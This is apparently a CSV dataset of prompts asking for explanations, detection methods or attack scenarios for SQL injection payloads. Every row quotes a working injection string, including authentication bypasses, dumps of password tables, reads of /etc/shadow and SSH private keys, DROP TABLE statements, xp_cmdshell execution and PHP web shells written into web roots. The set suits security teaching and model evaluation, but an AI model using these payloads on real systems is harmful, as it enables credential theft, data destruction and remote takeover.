prompt,attack_type
"Explain how this SQL injection payload works: ' UNION ALL SELECT table_name,NULL FROM information_schema.tables --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' AND LENGTH((SELECT @@version))>1 --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' INTO OUTFILE '/tmp/db-dump.txt' --,SQL Injection
"What happens if a user enters this SQL injection into a login field: 1 AND 1=CONVERT(int,@@version)",SQL Injection
Generate a security explanation for this SQLi payload: ' OR (SELECT sql FROM sqlite_master WHERE name='users') LIKE '%' --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 AND typeof((SELECT name FROM sqlite_master LIMIT 1))='text' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR (SELECT sql FROM sqlite_master WHERE name='users') LIKE '%' --,SQL Injection
"Explain how this SQL injection payload works: ' UNION SELECT NULL,password FROM users WHERE username='admin' --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; SELECT hex(load_file('/etc/passwd')) --,SQL Injection
How would you detect the presence of this SQLi payload: '/**/OR/**/1/**/=/**/1 --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1 UNION/**/SELECT/**/NULL --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR TRUE; SHUTDOWN --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR TRUE INTO DUMPFILE '/tmp/dump.bin' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1 RETURNING table_name FROM information_schema.tables --,SQL Injection
"Describe a scenario where a hacker uses this payload: ' UNION SELECT 1,LOAD_FILE('/etc/ssh/sshd_config') --",SQL Injection
Show how an attacker might use this SQL injection: ' OR (SELECT COUNT(*) FROM users)>0 --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR TRUE; RESET MASTER --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR TRUE AND EXISTS(SELECT version()) --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' INTO OUTFILE '/var/www/html/payload.php' --,SQL Injection
Explain how this SQL injection payload works: ' OR EXISTS(SELECT sql FROM sqlite_master WHERE sql LIKE '%CREATE%') --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1 LIMIT 9999 --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 AND typeof((SELECT name FROM sqlite_master LIMIT 1))='text' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR EXISTS(SELECT * FROM logs LIMIT 1) --,SQL Injection
Explain how this SQL injection payload works: ' OR CASE WHEN (1=1) THEN 1 ELSE 2 END=1 --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 UNION SELECT load_file('/etc/shadow') --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1;%23,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1 RETURNING table_name FROM information_schema.tables --,SQL Injection
"Demonstrate how this SQL injection exposes database data: ' UNION SELECT NULL,@@tmpdir --",SQL Injection
"Describe a scenario where a hacker uses this payload: ' OR ASCII(SUBSTRING(username,1,1))>64 --",SQL Injection
Describe how this payload can bypass authentication: ' OR 2>>1=1 --,SQL Injection
"Generate a security explanation for this SQLi payload: ' OR JSON_SEARCH('[""x"",""y""]','one','x') IS NOT NULL --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR (SELECT COUNT(*) FROM information_schema.tables)>0 --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR EXISTS(SELECT 1) --,SQL Injection
Generate a security explanation for this SQLi payload: ' UNION SELECT * FROM v$pwfile_users --,SQL Injection
"Generate a security explanation for this SQLi payload: ' UNION SELECT NULL,LOAD_FILE('/var/log/dmesg') --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR RANDOM()=RANDOM() --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' AND SHA1('a')='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' --,SQL Injection
"Show how an attacker might use this SQL injection: ' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' --",SQL Injection
Show how an attacker might use this SQL injection: ' AND ASCII('A')=65 --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1<<1=2 --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1; SELECT * FROM secrets --,SQL Injection
"What happens if a user enters this SQL injection into a login field: ' OR instr((SELECT sql FROM sqlite_master LIMIT 1),'CREATE')>0 --",SQL Injection
Describe how this payload can bypass authentication: ' UNION/**/SELECT/**/table_name FROM information_schema.tables --,SQL Injection
"What happens if a user enters this SQL injection into a login field: ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL --",SQL Injection
"What happens if a user enters this SQL injection into a login field: ' UNION SELECT sqlite_version(),NULL --",SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1;--,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 UNION SELECT NULL ORDER BY 3 --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1; SELECT * FROM secrets --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 INTO OUTFILE '/var/tmp/output.txt' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR EXISTS(SELECT * FROM mysql.user WHERE user='root') --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1 COLLATE latin1_swedish_ci --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR (SELECT COUNT(*) FROM information_schema.tables ORDER BY table_name LIMIT 1)>0 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))>0 --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR EXISTS(SELECT name FROM sqlite_master WHERE sql LIKE '%table%') --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 ORDER BY 2 --,SQL Injection
What happens if a user enters this SQL injection into a login field: 1 UNION SELECT load_file('/etc/passwd'),SQL Injection
Demonstrate how this SQL injection exposes database data: ' AND (SELECT username FROM users LIMIT 1)='admin' --,SQL Injection
How would you detect the presence of this SQLi payload: ' UNION SELECT LOAD_FILE('/root/.ssh/id_rsa') --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR TRUE; RESET MASTER --,SQL Injection
Describe how this payload can bypass authentication: '/**/OR/**/1/**/=/**/1 --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 'x'='x'; DROP TABLE users --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1 INTO OUTFILE '/usr/share/nginx/html/cmd.php' --,SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT LOAD_FILE('/etc/hosts'),NULL,NULL --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR CAST('a' AS CHAR)='a' --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR SLEEP(1) INTO OUTFILE '/tmp/x' --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR EXISTS(SELECT * FROM mysql.user) RETURNING * --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))>0 --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR (SELECT '<?php phpinfo(); ?>') INTO OUTFILE '/tmp/info.php' --,SQL Injection
Show how an attacker might use this SQL injection: ' AND (SELECT COUNT(*) FROM mysql.user)>0 --,SQL Injection
How would you detect the presence of this SQLi payload: ' UNION SELECT @@version_compile_os --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1# ORDER BY 10,SQL Injection
Generate a security explanation for this SQLi payload: ' OR (SELECT COUNT(*) FROM information_schema.tables ORDER BY table_name LIMIT 1)>0 --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR 1=1 INTO DUMPFILE '/var/lib/mysql/x1.bin' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR 1=1 LIMIT 1 OFFSET 1 --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1; EXEC xp_cmdshell 'whoami' --,SQL Injection
Show how an attacker might use this SQL injection: ' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS CHAR) LIKE '%' --,SQL Injection
"Explain how this SQL injection payload works: ' OR 'a' IN ('a','b','c') --",SQL Injection
Describe how this payload can bypass authentication: ' AND (SELECT 1337)=1337 --,SQL Injection
"Show how an attacker might use this SQL injection: ' OR MAKE_SET(1,'a','b')='a' --",SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 INTO OUTFILE '/tmp/x5.txt' RETURNING * --,SQL Injection
"Generate a security explanation for this SQLi payload: ' OR 1=1 AND JSON_EXTRACT('{""a"":true}','$.a')=true --",SQL Injection
Explain how this SQL injection payload works: ' UNION SELECT TO_BASE64(load_file('/etc/passwd')) --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=CAST('1' AS UNSIGNED) --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' OR 1=1 UNION SELECT database(),user() --",SQL Injection
"Describe a scenario where a hacker uses this payload: ' UNION ALL SELECT 1,'test','test123' --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR TRUE; SET GLOBAL slow_query_log=1 --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR EXISTS(SELECT 1 FROM pg_user LIMIT 1) --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=(SELECT 1 FROM dual) --,SQL Injection
Explain how this SQL injection payload works: ' OR CASE WHEN (1=1) THEN 1 ELSE 0 END --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 COLLATE utf8_general_ci --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR '1'='1' /*,SQL Injection
Write a natural-language explanation of this SQL injection string: ' UNION ALL SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/info2.php' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; SELECT length(load_file('/etc/passwd')) --,SQL Injection
Generate a security explanation for this SQLi payload: ' AND LENGTH(user())>0 --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1 UNION SELECT load_file('/etc/fstab') --,SQL Injection
"Explain how this SQL injection payload works: ' UNION/**/SELECT/**/1,2 --",SQL Injection
"What happens if a user enters this SQL injection into a login field: ' AND IF(1=1,SLEEP(1),0) --",SQL Injection
"Explain how this SQL injection payload works: ' OR 1=1 UNION SELECT database(),user() --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1;--,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1--mysql,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR EXISTS(SELECT NULL) RETURNING * --,SQL Injection
Describe how this payload can bypass authentication: admin') OR ('1'='1,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR EXISTS(SELECT * FROM mysql.user WHERE user='root') --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' UNION SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables --,SQL Injection
Show how an attacker might use this SQL injection: ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1 AND (SELECT LENGTH(database()) ORDER BY database() LIMIT 1)>0 --,SQL Injection
Describe how this payload can bypass authentication: ' RETURNING (SELECT version()) --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT usename,passwd FROM pg_shadow --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' AND SHA1('a')='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1 RETURNING table_name FROM information_schema.tables --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR convert((SELECT user()) USING utf8) LIKE '%' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS CHAR) LIKE '%' --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR CONCAT(database(),',',user()) LIKE '%' --",SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1; DROP TABLE secrets --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR TRUE; FLUSH HOSTS --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' AND (SELECT COUNT(*) FROM mysql.user)>0 --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 AND (SELECT LENGTH(database()) ORDER BY database() LIMIT 1)>0 --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 'admin'=(SELECT username FROM users LIMIT 1) --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 1=1 USING UTF8 --,SQL Injection
"How would you detect the presence of this SQLi payload: ' UNION SELECT NULL,@@tmpdir --",SQL Injection
What happens if a user enters this SQL injection into a login field: ' UNION ALL SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/sh1.php' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT CONNECTION_ID())>0 --,SQL Injection
"Describe a scenario where a hacker uses this payload: ' UNION ALL SELECT 1,'admin','pass' --",SQL Injection
How would you detect the presence of this SQLi payload: 1 AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1),SQL Injection
Explain how this SQL injection payload works: 1'; UPDATE accounts SET balance=99999 --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' OR 1=1 AND BENCHMARK(10000,MD5(1)) --",SQL Injection
Explain how this SQL injection payload works: ' INTO OUTFILE '/tmp/shell.php' --,SQL Injection
"Explain how this SQL injection payload works: ' UNION SELECT '<?php echo ""OWNED""; ?>' INTO OUTFILE '/var/www/html/o.php' --",SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT NULL,version() --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR TRUE IS TRUE --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' UNION SELECT @@version_compile_os --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; SELECT * FROM passwords --,SQL Injection
"What happens if a user enters this SQL injection into a login field: ' OR instr((SELECT sql FROM sqlite_master LIMIT 1),'CREATE')>0 --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR convert((SELECT user()) USING utf8) LIKE '%' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR CASE WHEN 1=1 THEN SLEEP(2) ELSE 0 END --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; SELECT * FROM users INTO OUTFILE '/tmp/pwned.txt' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR host='localhost' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT sqlite_version()) LIKE '%' RETURNING * --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT NULL,version(),user() --",SQL Injection
How would you detect the presence of this SQLi payload: ' OR 'a'='a RETURNING * --,SQL Injection
"How would you detect the presence of this SQLi payload: ' OR MOD(4,2)=0 --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1; WAITFOR TIME '00:00:10' --,SQL Injection
Show how an attacker might use this SQL injection: ' OR EXISTS(SELECT * FROM sqlite_master) RETURNING * --,SQL Injection
Describe a scenario where a hacker uses this payload: 1; EXEC master..xp_cmdshell 'whoami',SQL Injection
Show how an attacker might use this SQL injection: ' OR 1=1# ORDER BY 3,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT LENGTH(LOAD_FILE('/etc/shadow'))) > 0 --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 RETURNING table_name FROM information_schema.tables --,SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT sqlite_version(),NULL --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' AND (SELECT username FROM users LIMIT 1)='admin' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR/**/1=1/**/--,SQL Injection
Generate a security explanation for this SQLi payload: ' RETURNING '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/payload.php' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 'root' IN (SELECT user FROM mysql.user) --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 LOAD_FILE('/etc/passwd') --,SQL Injection
Explain how this SQL injection payload works: 1 AND (SELECT LENGTH(database()))>0,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT LOAD_FILE('C:\Windows\win.ini'),NULL --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --,SQL Injection
Describe how this payload can bypass authentication: ' OR (SELECT user()) REGEXP 'root' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR (SELECT LENGTH(group_concat(table_name)))>0 RETURNING * --,SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT 1,LOAD_FILE('/etc/ssh/sshd_config') --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1--mssql,SQL Injection
Describe how this payload can bypass authentication: ' OR EXISTS(SELECT current_database()) --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 INTO DUMPFILE '/tmp/dbdump2.bin' --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR CASE WHEN 1=1 THEN SLEEP(2) ELSE 0 END --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR CHAR_LENGTH('admin')=5 --,SQL Injection
"Show how an attacker might use this SQL injection: ' OR MID((SELECT database()),1,1)='t' --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1; WAITFOR DELAY '00:00:05'--,SQL Injection
Explain how this SQL injection payload works: ' OR session_user LIKE '%' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' AND (SELECT LENGTH(group_concat(table_name)) FROM information_schema.tables)>0 --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' UNION SELECT username,password FROM users --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR length('<?php echo 1; ?>') INTO OUTFILE '/tmp/test.php' --,SQL Injection
"Show how an attacker might use this SQL injection: ' OR IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(3),0) --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 2>>1=1 --,SQL Injection
"Describe a scenario where a hacker uses this payload: ' UNION SELECT LOAD_FILE('/etc/hosts'),NULL,NULL --",SQL Injection
"Show how an attacker might use this SQL injection: 1 OR IF(version() LIKE '%',1,0)",SQL Injection
Explain how this SQL injection payload works: ' UNION ALL SELECT NULL --,SQL Injection
How would you detect the presence of this SQLi payload: 1'; SELECT * FROM bank_accounts --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1; SELECT load_file('/etc/passwd') --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR (SELECT SLEEP(2)) --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' UNION SELECT SHA1('test') --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' OR (SELECT SUBSTRING(@@version,1,1))='5' --",SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR EXISTS(SELECT * FROM pg_user) RETURNING * --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1 RETURNING (SELECT current_database()) --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%user%') --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' OR (SELECT LENGTH(CONCAT(user(),database())))>0 --",SQL Injection
Describe a scenario where a hacker uses this payload: ' OR version() LIKE '%'-- RETURNING *,SQL Injection
How would you detect the presence of this SQLi payload: ' OR EXISTS(SELECT name FROM sqlite_master WHERE sql LIKE '%table%') --,SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR LOAD_FILE('/var/log/auth.log') LIKE '%' --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1; DROP TABLE secrets --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR LOAD_FILE('/etc/shadow') IS NOT NULL --,SQL Injection
Show how an attacker might use this SQL injection: ' ORDER BY 2--,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1 INTO DUMPFILE '/tmp/dbdump1.bin' --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' UNION ALL SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/sh1.php' --,SQL Injection
"Show how an attacker might use this SQL injection: ' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' --",SQL Injection
Show how an attacker might use this SQL injection: ' RETURNING (SELECT user()) --,SQL Injection
Describe a scenario where a hacker uses this payload: ' UNION SELECT username FROM all_users --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR 1=1 AND CONNECTION_ID()>0 --,SQL Injection
Explain how this SQL injection payload works: ' OR NOT(FALSE) --,SQL Injection
Describe how this payload can bypass authentication: ' OR TRUE; SET GLOBAL innodb_force_recovery=6 --,SQL Injection
Show how an attacker might use this SQL injection: ' AND EXISTS(SELECT COUNT(*) FROM users) RETURNING * --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR TRUE INTO DUMPFILE '/tmp/any.bin' --,SQL Injection
"Describe a scenario where a hacker uses this payload: ' OR (SELECT LENGTH(CONCAT(user(),database())))>0 --",SQL Injection
Show how an attacker might use this SQL injection: ' RETURNING (SELECT version()) --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 INTO OUTFILE '/tmp/pwned.txt' --,SQL Injection
Show how an attacker might use this SQL injection: ' OR ascii(lower('A'))=97 --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR TRUE%20--,SQL Injection
What vulnerability does this SQL payload try to exploit: ' UNION SELECT @@GLOBAL.sql_mode --,SQL Injection
Describe how this payload can bypass authentication: ' OR EXISTS(SELECT * FROM users WHERE username='admin') RETURNING * --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 AND SLEEP(1) --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR TRUE; SELECT load_file('/etc/passwd') --,SQL Injection
"What vulnerability does this SQL payload try to exploit: ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL --",SQL Injection
Describe a scenario where a hacker uses this payload: ' ORDER BY 3--,SQL Injection
"Demonstrate how this SQL injection exposes database data: ' OR TRUE RETURNING credit_card,cvv --",SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1 RETURNING (SELECT user()) --,SQL Injection
"Generate a security explanation for this SQLi payload: ' UNION SELECT username,password FROM users --",SQL Injection
"Describe a scenario where a hacker uses this payload: ' OR LEFT(user(),1)='r' --",SQL Injection
How would you detect the presence of this SQLi payload: ' OR FALSE/*test*/,SQL Injection
Explain how this SQL injection payload works: ' OR 1=(SELECT 1 FROM dual) --,SQL Injection
Describe a scenario where a hacker uses this payload: ' INTO OUTFILE '/tmp/evil.php' RETURNING * --,SQL Injection
"How would you detect the presence of this SQLi payload: ' UNION SELECT NULL,version() --",SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR 1=1 ORDER BY 100 --,SQL Injection
"Write a natural-language explanation of this SQL injection string: ' OR ASCII(SUBSTRING((SELECT user()),1,1))>0 --",SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR SLEEP(1) INTO OUTFILE '/tmp/x' --,SQL Injection
Explain how this SQL injection payload works: ' OR 1=1; SELECT length(load_file('/etc/passwd')) --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' INTO DUMPFILE '/tmp/raw.bin' --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' RETURNING '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/info.php' --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' AND (SELECT LENGTH(LOAD_FILE('/etc/hostname'))) > 0 --,SQL Injection
Show how an attacker might use this SQL injection: ' OR (SELECT LENGTH(database()))>0 RETURNING * --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR (SELECT COUNT(*) FROM information_schema.schemata)>=1 --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR version() LIKE '%' RETURNING * --,SQL Injection
Explain how this SQL injection payload works: ' OR convert((SELECT user()) USING utf8) LIKE '%' --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR EXISTS(SELECT 1 FROM pg_user LIMIT 1) --,SQL Injection
Explain how this SQL injection payload works: ' RETURNING load_file('/proc/mounts') --,SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR TRUE --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 'abc' REGEXP 'a.*' --,SQL Injection
Show how an attacker might use this SQL injection: ' UNION SELECT MD5('test') --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR 1=1; EXEC master..xp_cmdshell 'ipconfig /all' --,SQL Injection
Describe a scenario where a hacker uses this payload: ' RETURNING current_database() --,SQL Injection
"Generate a security explanation for this SQLi payload: ' AND IF((SELECT LENGTH(user()))>1,SLEEP(3),0) --",SQL Injection
What vulnerability does this SQL payload try to exploit: ' OR 1=1 AND database() LIKE '%' --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 INTO DUMPFILE '/tmp/dbdump2.bin' --,SQL Injection
Describe how this payload can bypass authentication: ' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>=1 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR 1=1 AND 1=1 ORDER BY 3 --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR (SELECT COUNT(*) FROM users)>0 --,SQL Injection
Explain how this SQL injection payload works: ' OR (SELECT 1 ORDER BY 1)>0 --,SQL Injection
What happens if a user enters this SQL injection into a login field: admin'||'1'='1,SQL Injection
"How would you detect the presence of this SQLi payload: ' UNION ALL SELECT 1,'test','test123' --",SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR (SELECT sqlite_version()) LIKE '3.%' --,SQL Injection
Show how an attacker might use this SQL injection: ' OR '1'='1' /*,SQL Injection
What happens if a user enters this SQL injection into a login field: ' WAITFOR DELAY '0:0:5' --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 INTO DUMPFILE '/tmp/dbdump1.bin' --,SQL Injection
Describe how this payload can bypass authentication: ' OR TRUE; SELECT version() FROM pg_catalog.pg_settings LIMIT 1 --,SQL Injection
Describe how this payload can bypass authentication: ' OR 1=1 INTO DUMPFILE '/tmp/dbdump3.bin' --,SQL Injection
Write a natural-language explanation of this SQL injection string: ' OR TRUE; UPDATE users SET admin=1 WHERE username='guest' --,SQL Injection
"Show how an attacker might use this SQL injection: ' OR TRUE RETURNING credit_card,cvv --",SQL Injection
How would you detect the presence of this SQLi payload: ' OR (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%' --,SQL Injection
Generate a security explanation for this SQLi payload: ' UNION SELECT LOAD_FILE('/etc/hostname') --,SQL Injection
Describe a scenario where a hacker uses this payload: ' OR CASE WHEN (1=1) THEN 1 ELSE 2 END=1 --,SQL Injection
Describe a scenario where a hacker uses this payload: ' UNION SELECT @@GLOBAL.time_zone --,SQL Injection
What happens if a user enters this SQL injection into a login field: ' OR session_user LIKE '%' --,SQL Injection
How would you detect the presence of this SQLi payload: ' OR 'admin' IN (SELECT username FROM users) --,SQL Injection
Demonstrate how this SQL injection exposes database data: ' OR 1=1%20--,SQL Injection
Describe a scenario where a hacker uses this payload: ' UNION SELECT password FROM SYS.USER$ --,SQL Injection
Generate a security explanation for this SQLi payload: ' OR 1=1-- RETURNING hex(load_file('/etc/passwd')),SQL Injection
